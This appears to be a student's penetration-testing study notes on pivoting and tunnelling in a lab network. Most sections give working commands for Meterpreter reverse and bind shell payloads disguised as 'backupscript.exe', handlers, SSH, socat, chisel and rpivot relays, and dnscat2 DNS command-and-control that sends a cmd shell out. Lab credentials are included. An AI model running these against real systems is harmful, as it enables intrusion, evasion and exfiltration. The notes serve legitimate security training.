*Pivoting* is using a compromised machine to move to other networks through the compromised device.

Terms to describe compromised host used to *pivot* to a previously unreachable network.
- `Pivot Host`
- `Proxy`
- `Foothold`
- `Beach Head system`
- `Jump Host`

Used to defeat segmentation. Whereas *tunelling* is to encapsulate network traffic into another protocol and route traffic through it.

## Comparing Lateral Movement, Pivoting and Tunelling
### Lateral Movement
*Lateral Movement* is the technique used to further our access to additional `hosts`, `applications` and `services`.

Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. This can often enable privilege
```
During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further.
```

### Pivoting
Utilizing multiple hosts to cross `network` boundaries that we would not usually have access to. The goal is to move deeper into a network by compromising target host and infrastructure.

```
During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment.
```

_Look out for multiple nics?_ 

### Tunneling
Where we use common services and protocols to disguise traffic. (eg using HTTP to communicate with C&C Server). Obfuscation and Detection Avoidance.

```
One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.
```


## The Network Behind Pivoting
### IP Addressing & NICs
Every computer communicating on a network needs an *IP*. *IP*s are usually obtained dynamically from a *DHCP* server. *IP* addresses can be static and commonly seen with:
- Servers
- Routers
- Switch virtual interfaces
- Printers
- And any devices that are providing critical services to the network

IP address assigned directly to *NIC* (`Network Interface Card`).
Always important to check for additional *NIC*s with
	`ifconfig` `Unix`
	`ipconfig` `Windows`

##### ifconfig
each NIC has an identifier (`eth`, `lo`, `tun0`)
- `tun0` Indicated a VPN

##### ipconfig
when network traffic is destined for an ip located on a different network, the computer will send traffic to its assigned *default gateway*

### Routing
`netstat -r` or `ip route`

Defining characteristic of a router is that it has a routing table that it uses to forward traffic based on the destination IP address.

*Routing Table* assists the system to make routing decisions. When a packet is created and has a destination before it leaves the computer, the routing table decides where to send it.
Any traffic destined for networks and not present in routing table will be sent to the default route. 

### Protocols, Services and Ports
*Protocols* are the rules that govern network communications. Many protocols have corresponding *ports* that act as identifiers.
An open *port* corresponds to an application we may be able to connect to.

## Dynamic Port Forwarding with SSH and SOCKS Tunelling
### Port Fowarding in Context
*Port Forwarding* is a technique that allows us to redirect a communication request from one port to another. 
*Port Forwarding* uses `TCP` as the primary communication layer. Different layers can be used to encapsulate forwarded traffic `SSH`, [[Definitions#SOCKS|SOCKS]]

### SSH Local Port Forwarding
![[SSH.png]]

If a service with an `SSH` port is open we can either request services directly from the open port or via `SSH`.

***EG***
```shell-session
PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql
```

We can either directly connect to `mysql` through `tcp 3306` or `SSH` into the machine and forward port `tcp 3306` to a port on our local machine eg:1234 via `SSH`
```
ssh -L 1234:localhost:3306 ubuntu@externalhost

ssh -L localport:localhost:externalporttoforward hostname@externalhost
```
*We can forward multiple ports at once*
We can then confirm the forwarded port with netstat
```
netstat -antp
```
### Setting up to Pivot
If we check `ifconfig` on linux host we can view if a server has multiple `NiCs` 
we can identify `Nics` from `ens` and loopback interfaces with `lo`.

We dont know which services lie on the other side of the pivot point. 
We need to scan the ip addresses which lie on the opposite side but we must first establish a route with dynamic port forwarding and pivot our network packets via the compromised server.

We cannot perform this scan directly from our attack host because it does not have roots to the network.

We can do this by starting a *SOCKS Listener* on our *localhost* and then configure `SSH` to forward that traffic via `SSH` to the alternate network after connecting to the target host.

This is called *SSH Tunelling* over *Socks Proxy*.

`SOCKS` stands for *Socket Secure*, a protocol that helps communicate with servers where you have firewall restrictions in place. 
in `SOCKS` the initial network traffic is generated  by the `SOCKS` client which then connects to the `SOCKS` server controlled by the user who wants to access a server on the client-side. Once connection is established, network traffic can be routed through the `SOCKS` server on behalf of the connected client.

This technique is used to circumvent restrictions put in place by firewalls, and allow an external entity to bypass a firewall and access a service in a fire-walled environment.
`SOCKS` proxies can pivot via creating a route to an external server from *NAT Networks*.

`SOCKS` proxies are currently of two types: `SOCKS4` and `SOCKs5`.
	`SOCKS4` doesn't provide any authentication and `UDP` support
	`SOCKS5` does. 

![[ReversePortForwarding.png]]

- Attack Host starts `SSH Client` and requests the `SSH Server` to allow it to send `TCP` data over `SSH` socket.
- `SSH Server` acknowledges and `SSH Client` then starts listening on *localhost:9050*
- Whatever data sent to *localhost:9050* will be broadcast to entire network over `SSH`

### Enabling Dynamic Port Forwarding with SSH
```shell-session
ssh -D 9050 ubuntu@10.129.202.64
```

`-D` argument requests `SSH` server to enable dynamic port forwarding.
Once enabled we need to use *proxychains* to route any tools packets over port `tcp 9050`.

*Proxychains* can route `TCP` connections through `SOCKS`, `TOR` and `HTTP/HTTPS`.

Using *Proxychains* we can hide the IP of our requesting host as the receiving host will only see the IP of our pivot machine.

*Proxychains* is often used to force an application's `TCP traffic` to go through hosted proxies like `SOCKS4`/`SOCKS5`, `TOR`, or `HTTP`/`HTTPS` proxies.

##### /etc/proxychains.conf

### Using Nmap with Proxychains
To use *proxychains* we just supersede any program with `proxychains`
*Proxychains* default port is `9050`

```shell-session
proxychains nmap -v -sn 172.16.5.1-200
```
`-sn` is a host discovery with no specified ports.


this is called *Socks Tunelling*.
We can only perform a *full TCP connect* (`nmap -sT`) scan over *proxychains* as it cannot understand partial packets and therefore cannot understand *UDP* scans.

*host-alive* checks may not work against windows targets as the Windows Defender Firewall blocks `ICMP` requests (*Pings*) by default.


### Enumerating the Windows Target with Proxychains
proxychains nmap -v -sn IP

```
proxychains nmap -v -Pn -sT IP
```
`-v verbose`
### Using Metasploit with Proxychains
```
proxychains msfconsole
```

### Using Xfreerdp with proxychains
```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

***Always scan for RDP with metasploit, Service can be called something else***


## Remote/Reverse Port Forwarding with SSH
The image below shows a scenario where we can `RDP` into the windows host A. Its possible as in the previous example to pivot into the windows host via the Ubuntu host.
![[Tunelling.png]]
The outgoing connection to the windows host is limited to the internal network 172.16.5.0/23 and we do not have a direct connection. If we start a Metasploit listener and try and get a reverse shell it will not connect directly to us as we are not on the internal network.
	We may need to *upload/download* files, use *exploits* or *low level windows API* using *meterpreter* to perform enumeration on the machine which may not be possible with *LOTL*

In these cases we need to find a pivot host which is a connection point between our attack host and our windows server.

To gain a *Meterpreter shell* on the windows machine we need to create a `HTTPS` payload with `msfvenom` and change the configuration for the reverse connection to be the Pivot hosts IP.
We will then use port `tcp 8080` on the Pivot host to forward all our packets to our attack hosts 8000 port where metasploit is listening.

### Creating a payload with MSFvenom
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

### Configuring and starting the multi handler
```shell-session
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```
Once our payload is created and our listener is configured and running. We can copy the payload to the Ubuntu server with the `scp` command since we have the `SSH` credentials.
### Transferring Payload to Windows Host
```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

After copying we start a *python 3* http server in the same folder we copy our payload

```
python3 -m http.server 8123 
```

We can then download on the windows machine
```powershell-session
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Once we have the file downloaded to the windows host we will use *ssh remote port forwarding* to forward connections from the ubuntu servers port 8080 to our msfconsole listener on 8000.

`-vN` Verbose
`-R` asks Ubuntu server to listen on *targetIPaddress*:8080 and forward all incoming ports to connections on port `tcp 8080` to our attack host on `tcp 8000`

```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

### Session Established
Our *meterpreter* session should then accept that our incoming connection is from localhost:8000 since we are recieving data over our `local SSH Socket` .

![[MSFTunneling.png]]

## Meterpreter Tunneling and Port Forwarding
If we have a scenario where we have *Meterpreter* shell access on the Linux pivot host and we want to perform enumeration scans through the pivot host, but we want to take advantage of the conveniences the *meterpreter* session brings. 

In these cases we can still create a pivot with our *meterpreter* session without relying on `SSH` port forwarding 

### Creating Payload for Ubuntu Pivot Host
```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

We then need to start a `multi/handler` on *Metasploit*
```shell-session
use exploit/multi/handler
```

We can then copy the `backupjob` binary over to the pivot host with `scp` or a `http` server.
We must also make it executable with `chmod +x`

We know the windows target is on the `172.16.5.0/23` assuming the windows firewall is allowing `ICMP` requests we would want to perform a ping sweep on the network, which we can do using the *meterpreter* `ping_sweep` module.

```shell-session
 run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

We can also perform a ping sweep directly on the target machine with a for loop

##### Ping Sweep for Loop on Linux Pivot Hosts
```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

##### Ping Sweep for loop on CMD
```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

##### Ping Sweep for loop on Powershell
```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

***Always  ping sweep twice to ensure arp cache gets built***
If a hosts firewall blocks `ICMP` requests in these cases we can perform a `TCP` scan on `172.16.5.0/23` with Nmap. 
Instead of port forwarding we can use *Metasploit's* post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host.
We will configure the `SOCKS` proxy for *SOCKS version 4a*.
This will start a listener on port *9050* and route all traffic received by our *meterpreter* session.

### Configuring MSF's Socks Proxy
```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
```

#### Confirming Proxy is running
```shell-session
msf6 auxiliary(server/socks_proxy) > jobs
```

#### Creating Routes
We need to tell our socks proxy to route all traffic via our *meterpreter* session. We can use the *post/multi/manage/autoroute* module from *Metasploit* to add routes for the `172.16.5.0`  subnet and then route all our *proxychains* traffic.

#### Autoroute
```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

It is also possible to add routes with *autoroute* from the *meterpreter* session.

```shell-session
run autoroute -s 172.16.5.0/23
```

We can then use `-p` to list active routes and make sure our configuration is successful.

```
run autoroute -p
```

We will now be able to use *proxychains* to route our *NMAP* traffic over `tcp 9050`

```shell-session
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

### Port Forwarding
Port forwarding can also be accomplished with *Metasploits* `portfwd` module.

We can enable a listener on our attack host and request *Meterpreter* to forward all packets recieved on this port via our *meterpreter* session to a remote host on the `172.16.5.0/23` network.
```shell-session
help portfwd
```

#### Creating Local TCP Relay
```shell-session
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

The above command requests the *meterpreter* shell to start a listener on our attack hosts local `-l` port `tcp 3300` and forward all the packets to the remote `-r` windows server `172.16.5.19` on port `tcp 3389` `-p` via our *meterpreter* session.

Now if we execute *xfreerdp* on our local session on port `tcp 3300` we will connect to the remote windows server's `rdp` port `tcp 3389` 

```shell-session
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```


### Meterpreter Reverse Port Forwarding
*meterpreter* can also perform *Reverse Port Forwarding*.
*Reversed port forwarding* is when we want to listen in on a specific port on the compromised server and forward all incoming shells from the *pivot host* to our attack server.

We start a listener on a new port on our attack host `tcp 8081` and request all traffic the *pivot host* receives on port `tcp 1234` to our listener on `tcp 8081`.

We can create a reverse port forward on our existing shell using the command below
```shell-session
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

#### Configuring Multi Handler
```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

We can now create a reverse shell payload that will send a connection back to our *Pivot server* on `172.16.5.129:1234` when executed on our *windows host*. 
Once our *Pivot server* receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

Finally we can execute the payload on the *Windows Server* we will receive a shell from Windows via our *Pivot Host*. 

## Socat Redirection with a Reverse Shell
*Socat* is a bidirectional relay tool that creates pipe sockets between *2* independant network channels without the need for `SSH` Tunneling.

*Socat* acts as a re-director that can listen on one host and one port and forward that data 
to another IP address or port. We can start socat on our pivot host.

```shell-session
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

*Socat* will listen on localhost port `tcp 8080` and forward all traffic to our attack host on port `tcp 80`. Once our redirector is configured we can create a payload to connect back to our redirector. 

We also need to start a listener on our *attack host* as soon as *Socat* receives a connection it immediately forwards it to our target.

#### Creating the Windows Payload
```shell-session
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

We need to transfer this payload to the windows host. 

### Configuring and starting the handler
```shell-session
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run
```


## Socat Redirection with Bind Shell
Similiar to *Socat*'s reverse shell redirector, we can also create a bind shell director. 

This is the opposite of a reverse shell, a bind shell will start a will start a listener on the Windows(`Victim`) host. At the same time we can create a *Socat* redirector on the *Pivot Host* which will listen for incoming connections from the *Metasploit* bind handler and forward those to the *Windows Host*. 
![[Socat.png]]

### Creating a Windows Payload
```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

We then need to start a *Socat* bind shell which listens on port `tcp 8080` and forwards packets to the *Windows Host* on port `tcp 8443`

#### Starting a Socat Bind Shell
```
socat TCP4-LISTEN:8080, fork TCP4:<PIVOT HOST IP>:8443 
```

We then start the *metasploit*

```shell-session
use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run
```


## SSH for Windows plink.exe
*Plink* short for `PuTTY Link` is a Windows command-line `SSH` tool that comes as part of the `PuTTY Package`.  Similiar to `SSH` *Plink* can be used to create dynamic port forwards and `SOCKS` proxies. 

	Before 2018 windows did not have a native SSH client. Users had to install their own and the command line of choice was Putty

	Plink can also be used on our primary attack host if we use a Windows System

### Getting to Know Plink
![[Plink.png]]
The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

#### Using Plink.exe
```cmd-session
plink -ssh -D 9050 ubuntu@10.129.15.50
```

We can create a `SOCKS` tunnel with *Proxifier* via the `SSH` session we just created. 
*Proxifier* is a windows tool that creates a tuneled network for desktop applications and allows it to operate through a `SOCKS` or `HTTPS` proxy and allows for proxy chaining.
It is possible to create a profile where we can configure the `SOCKS` server to be started by *Plink* on port 9050.
![[Proxifier.png]]
After configuring the SOCKS server for `127.0.0.1` and port 9050, we can directly start `mstsc.exe` to start an RDP session with a Windows target that allows RDP connections.

### SSH Pivoting with Sshuttle
*Sshuttle* is another tool written in Python which removes the need to configure proxychains.
This tool only.
*Sshuttle* can be useful for automating the execution of iptables and adding pivot rules to the remote host.
We can configure the ubuntu server as a pivot point and route all of `Nmaps` traffic network traffic with *Sshuttle*. 

### Installing Sshuttle

***Cant Get Sshuttle to install***
```shell-session
sudo apt-get install sshuttle
```

To use shuttle we need to the the:
`-r` flag to connect to a remote machine with a username and password.
We need to include the network or IP we want to through the pivot host the network `172.16.5.0/23`.

### Running Sshuttle
```shell-session
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

*Sshuttle* creates an entry into our `iptable` to redirect all traffic to the `172.15.6.0/23` through the pivot host.

### Traffic Routing through iptables Routes
```shell-session
 nmap -v -sV -p3389 172.16.5.19 -A -Pn
```

## Web Server with Rpivot (PYTHON)
*Rpivot* is a reverse `SOCKS` proxy tool written in python for `SOCKS` tunneling. 
*Rpivot* binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. 

In the scenario below we have a web server on our internal network(`172.16.5.135`), which we want to access with a *Rpivot* proxy.
![[Socks.png]]

We can start our *rpivot* `SOCKS` proxy server using the below command to allow the client to connect on port `TCP 9999` and listen on our port `TCP 9050` for proxy pivot collections.

### Installing Rpivot
```shell-session
git clone https://github.com/klsecservices/rpivot.git
sudo apt-get install python2.7
```

##### On Attack Host
```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

We then need to transfer *Rpivot* 
### Transferring rpivot to target 
```shell-session
scp -r client.py ubuntu@<IpaddressOfTarget>:~/client.py
```
```shell-session
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

We can then connect to the internal web-server with *firefox*.
```shell-session
proxychains firefox-esr 172.16.5.135:80
```

There can be scenarios where we cannot directly pivot to an external server (`attack host`)  on the cloud.

This is useful for when some orginizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a)
configured with the domain controller.
In such cases we can provide additional *NLTM authentication* option to rpivot to authenticate via the `NLTM` proxy. 
In this case we can use rpivot's *client.py* in the following way:
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

***REMEMBER CLIENT ON PIVOT HOST AND SERVER ON ATTACK HOST***

## Port Forwarding with Windows Netsh (EXE)
*Netsh* is a windows command line tool that can help with the network configuration of a Windows System.

We can use *Netsh* for :
- `Finding routes`
- `Viewing the firewall configuration`
- `Adding proxies`
- `Creating port forwarding rules`

In the below example our compromised host is Windows 10 IT Admin's workstation `10.129.15.150,172.16.5.25`
![[SocksServer.png]]
We can use *Netsh.exe* to forward all data recieved on a specific port `tcp 8080` to a remote host on a remote port.

#### Using Netsh.exe to Port Forward
```cmd-session
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

#### Verify Port Forward
```cmd-session
netsh.exe interface portproxy show v4tov4
```

after configuring the *portproxy* on our *Windows-based* Pivot Host, we will try to connect to port `TCP 8080` of this host from our attack host using `xfreerdp`. Once a request is sent from our attack host, the windows host will route our traffic according to the proxy settings set by `netsh.exe`.

## DNS Tunelling with Dnscat2 (RUBY)
*Dnscat2* is a tunneling tool that uses `DNS` protocol to send data between two hosts.
It uses encrypted *Command and Control* (`C&C or C2`) channel and sends data inside `TXT` records within the `DNS` protocol. 

Usually every *Active Directory* environment in a corporate setting will have its own `DNS` server which will resolve host names to IP addresses and route traffic to external `DNS` servers participating in the overarching `DNS` system. 

When a local `DNS` server tries to resolve an address, data is ex-filtrated and sent over the network instead of a legitimate `DNS` request. *Dnscat2* can be a stealthy approach to exfiltrate data whilst evading firewall detections which strip the `HTTPS` connections and sniff the traffic.

We can use *Dnscat2* server on our *Attack Host* and execute the *Dnscat2* client on another windows host.

### Setting up & Using dnscat2
If we dont have *Dnscat2* we can set it up like this.
```shell-session
git clone https://github.com/iagox86/dnscat2.git
```
We can then start *Dnscat2* with the `dnscat2` file.

#### Starting the dnscat2 server
```shell-session
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

After running the server it will provide us with a secret key, which we will provide to the *dnscat2* client on the *Windows Host* so it can authenticate and encrypt the data that is sent to our external *dnscat2* server. We can use the client with the *dnscat2* project or [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell). (powershell *dnscat2*) program that can establish a connection to a *dnscat2* server. We can clone it to our attack host and then transfer it to our target. 

#### Cloning dnscat2-powershell to Attack Host
```shell-session
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Once the `dnscat2.ps1` file is on the attack host we import it and run associated cmd-lets

#### Importing dnscat2.ps1
```powershell-session
Import-Module .\dnscat2.ps1
```
After it is imported, we can establish a tunnel with the server running on our *Attack Host*. We can send a `CMD` shell session back to our server.

```powershell-session
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

We need to use our Secret key `-PreSharedSecret` generated on our server to ensure our server session is established and encrypted. 
#### Confirming Session Establishment
```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```
We can list options with `?`

#### Listing dnscat2 Options
```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

We can use *dnscat2* to interact with sessions and move further into a target environment on engagements. 

***Practice dnscat2 in the future***
#### Interacting with the Established Shell
```shell-session
window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

## SOCKS5 Tunneling with Chisel (GO)
*Chisel* is a `TCP/UDP` based tunneling tool written in go that uses `HTTP` to transport data secured with `SSH`.
*Chisel* can create a client-server tunnel connection in a firewall restricted environment. Lets consider a scenario where we have to tunnel our traffic to a *webserver* on the `172.16.5.0/23` network (internal network). We have control of the *Domain Controller* with the address `172.16.5.19`. This is not directly accessible to our attack host since our *attack host* and *domain controller* belong to different network segments.
However, since we have compromised the *domain controller*, we can start a *Chisel* server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel

### Setting up and using Chisel
Before we can use chisel, we need it on our attack host. 
```shell-session
	git clone https://github.com/jpillora/chisel.git
```

```
cd chisel
go build
```

It can be helpful to keep in mind the size of files we transfer to our compromised machine, not just taking into account performance factors but also detection. 

Complimentary Resources:
- [Tunneling with Chisel and SSF](https://0xdf.gitlab.io/cheatsheets/chisel)
- IppSec's walkthrough of the box `Reddish` 24:29 mark of his [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s)

#### Chisel on the Pivot Host
```shell-session
scp chisel <USER>@<PIVOT HOST>:~/
```
```shell-session
./chisel server -v -p 1234 --socks5
```

The *Chisel* listen will listen on port `TCP 1234` using *SOCKS5* (`--socks5`) and forward it to all the networks that are accessible from the *pivot host*. In this case the *pivot host* has the interface on `172.16.5.0/23` network, which will allow us to reach hosts on that network.

We can then start a client on our attack host and connect to the *Chisel* server.

#### Connecting to the Chisel Server
```shell-session
./chisel client -v <PIVOTHOST>:1234 socks
```
We now need to modify our *proxychains* configuration file as *Chisel* uses port `TCP 1080`. 
We need to add port `TCP 1080` to the end of `/etc/proxychains.conf`

```shell-session
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Now if we use *proxychains* with *xfreerdp* we can connect to the *DC* on the internal network via the tunnel we have created to the pivot host. 

### Chisel Reverse Pivot
There may be firewall scenarios which restrict inbound connections to our compromised target. In such cases we can use *Chisel* in reverse mode (`--reverse`)

When the *Chisel* server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversal.
The server will listen and accept connections, and they will be proxied through the client, which specifies the remote.

Reverse remotes specify *R:socks* will listen on the server's default port (`TCP 1080`) and terminate the connection at the client's internal `SOCKS5` proxy.

#### Starting Chisel on the Attack Host
```shell-session
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Then we connect from the *Pivot Host* to our attack host, using the option `R:socks`.

#### Connecting the Chisel Client to our Attack Host.
```shell-session
./chisel client -v 10.10.14.17:1234 R:socks
```

#### Editing Proxychains.conf
```shell-session
tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

If we use *proxychains*, we can connect to the *Domain Controller* on the internal network through the tunnel we have created to the *Pivot host*.

## ICMP Tunneling with SOCKS
*ICMP Tunneling* encapsulates traffic within `ICMP` packets, containing *echo request* and *responses*. 
*ICMP Tunneling* would only work when ping responses are permitted within a firewalled network. 
When a host within a firewalled network is allowed to an external server, it can encapsulate its traffic within the ping echo request and send it to an external server.

The server can validate this traffic and send an appropriate response, which is extremely useful for data ex-filtration and creating pivot tunnels to an external server.

We will use *ptunnel-ng* to create a tunnel between our *Pivot Host* and our *Attack Host*
once a tunnel is created we will be able to proxy our traffic through the *ptunnel-ng client*. 

***We start a ptunnel-ng server*** on the target *pivot host*
***We start a ptunnel-ng client*** on the *Attack Host*

### Setting up and using  ptunnel-ng
```shell-session
git clone https://github.com/utoni/ptunnel-ng.git
```
We then need to run the `./autogen.sh` script
```shell-session
sudo ./autogen.sh 
```

After using the shell script *ptunnel-ng* 

--------------------
***COME BACK TO THIS IF NEEDED DOESNT WORK RN***

-----------------

## RDP and SOCKS Tunneling with SocksOverRDP
*For use when limited to a windows network and cannot use SSH for pivoting*
*We need to use tools available to windows os*

*SOCKSOverRDP* is a tool that uses *Dynamic Virtual Channels* (`DVC`) from the `RDP` service feature of Windows.

`DVC` is responsible for tunneling packets over the `RDP` connection. 
Examples:
- Clipboard to transfer data
- audio sharing

We use *SocksOverRDP* to tunnel our custom packets then proxy through it using *proxifier*.

We need the appropriate Binaries:
1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
- We can look for `ProxifierPE.zip`

We can then connect with *xfreerdp* and copy `SocksOverRDP.zip` file to the target. 
From the windows target we then need to load `SocksOverRDP.dll` using `regsvr32.exe`

### Loading SocksOverRDP.dll using regsvr32.exe
```cmd-session
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

We  can now connect to `172.16.5.19` over `RDP` using `mstc.exe`, and we should receive a prompt that the *SocksOverRDP* plugin is enabled, it will listen on `127.0.0.1:1080` with the credentials `victor:pass@123`
![[SORDP2.png]]
We will need to transfer `SocksOverRDPx64.zip `or just the `SocksOverRDP-Server.exe` to `172.16.5.19`. We can then start `SocksOverRDP-Server.exe` with Admin privileges.
![[SocksOverRDP.png]]
We then go back to the *Foothold* and check `netstat`. We will see our `SOCKS` listener started on `127.0.0.1:1080`.

#### Confirming the SOCKS listener is started.
```cmd-session
netstat -antb | findstr 1080
```

We can then transfer *proxifier* to the *Windows Target* on the `10.129.x.x` network.
We configure it to send packets to `127.0.0.1:1080` where proxifier will route the given traffic. Proxifier will route traffic through the given host and port.

#### Configuring Proxifier
```
PROFILE > PROXY SERVERS > ADD > 127.0.01 > TCP 1080
```
With proxifier configured we can start `mstc.exe` and it will use proxifier to route all traffic via `127.0.0.1:1080 `, which will tunnel it over `RDP` to `172.16.5.19` which will then route to `172.16.6.155` which using  the `SocksOverRDP-server.exe`. 

### RDP Performance Considerations
When interacting with our RDP sessions on an engagement, we may find ourselves contending with slow performance in a given session, especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the `Experience` tab in mstsc.exe and set `Performance` to `Modem`.

